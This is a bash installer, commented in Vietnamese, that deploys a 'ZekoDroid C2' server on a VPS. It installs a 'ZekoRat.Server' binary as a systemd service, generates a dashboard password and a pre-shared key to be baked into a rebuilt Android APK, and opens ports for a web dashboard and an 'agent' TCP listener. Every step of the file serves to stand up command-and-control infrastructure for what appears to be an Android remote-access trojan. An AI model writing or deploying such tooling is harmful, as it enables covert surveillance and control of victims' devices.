#!/usr/bin/env bash
# Cai ZekoDroid C2 len Ubuntu/Debian VPS. Chay: bash install-vps.sh
set -euo pipefail

APP_DIR=/opt/zekodroid
SVC=zekodroid
PORT_HTTP=${ZK_HTTP_PORT:-8080}
PORT_TCP=${ZK_TCP_PORT:-7878}

[ "$(id -u)" -eq 0 ] || { echo "chay bang root"; exit 1; }

id -u zekodroid >/dev/null 2>&1 || useradd -r -s /usr/sbin/nologin -d "$APP_DIR" zekodroid

mkdir -p "$APP_DIR"
if [ -f "./ZekoRat.Server" ]; then
  cp ./ZekoRat.Server "$APP_DIR/"
elif [ ! -f "$APP_DIR/ZekoRat.Server" ]; then
  echo "KHONG thay ZekoRat.Server — copy binary vao $APP_DIR truoc"; exit 1
fi
chmod +x "$APP_DIR/ZekoRat.Server"
chown -R zekodroid:zekodroid "$APP_DIR"

if [ ! -f /etc/zekodroid.env ]; then
  PASS=$(head -c 12 /dev/urandom | base64 | tr -d '/+=' | head -c 12)
  PSK=$(head -c 24 /dev/urandom | base64 | tr -d '/+=' | head -c 32)
  cat > /etc/zekodroid.env <<EOF
ZK_HTTP_PORT=$PORT_HTTP
ZK_TCP_PORT=$PORT_TCP
ZK_USER=admin
ZK_PASS=$PASS
ZK_PSK=$PSK
ZK_DB=$APP_DIR/zekodroid.db
EOF
  chmod 600 /etc/zekodroid.env
  echo "== dashboard pass: $PASS"
  echo "== PSK (dan vao config.properties roi build lai APK): $PSK"
else
  echo "== giu /etc/zekodroid.env cu"
fi

install -m 644 "$(dirname "$0")/zekodroid.service" /etc/systemd/system/$SVC.service
systemctl daemon-reload
systemctl enable --now $SVC
sleep 1
systemctl --no-pager --lines=8 status $SVC || true

if command -v ufw >/dev/null; then
  ufw allow "$PORT_HTTP"/tcp >/dev/null || true
  ufw allow "$PORT_TCP"/tcp >/dev/null || true
  echo "== ufw: mo $PORT_HTTP va $PORT_TCP"
fi

IP=$(curl -s -4 --max-time 5 ifconfig.me || echo "IP_VPS")
echo
echo "=============================================="
echo " dashboard : http://$IP:$PORT_HTTP"
echo " agent tcp : $IP:$PORT_TCP"
echo " env       : /etc/zekodroid.env"
echo " log       : journalctl -u $SVC -f"
echo "=============================================="